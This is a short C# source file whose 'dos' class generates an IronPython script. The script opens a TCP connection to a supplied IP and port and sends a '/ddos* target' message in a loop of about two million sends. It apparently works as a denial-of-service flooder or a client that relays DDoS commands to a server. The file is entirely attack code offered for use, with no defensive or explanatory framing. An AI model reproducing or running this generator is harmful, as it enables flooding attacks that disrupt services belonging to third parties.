using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace Client_Side
{
    class dos
    {
        public string createPythonFile(string ipAddress, int port, string target)
        {
            StringBuilder statements = new StringBuilder();
            //Python code for sending a large amount of data in a loop
            statements.AppendLine("import sys");
            statements.AppendLine("sys.path.append('C:/Program Files/IronPython 2.7/Lib')");
            statements.AppendLine("import socket");
            statements.AppendLine($"ip = '{ipAddress}'");
            statements.AppendLine($"port = {port}");
            statements.AppendLine($"message = '/ddos* {target}:*******************************************************************************'");
             
            statements.AppendLine(@"s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)");
            statements.AppendLine(@"s.connect((ip,port))");
            statements.AppendLine(@"i = 10000000");
            statements.AppendLine(@"while i>-1000000:");
            statements.AppendLine(@"    s.send(message)");
            statements.AppendLine(@"    i-=5");
            statements.AppendLine(@"s.close()");
            return statements.ToString();
        }
    }
}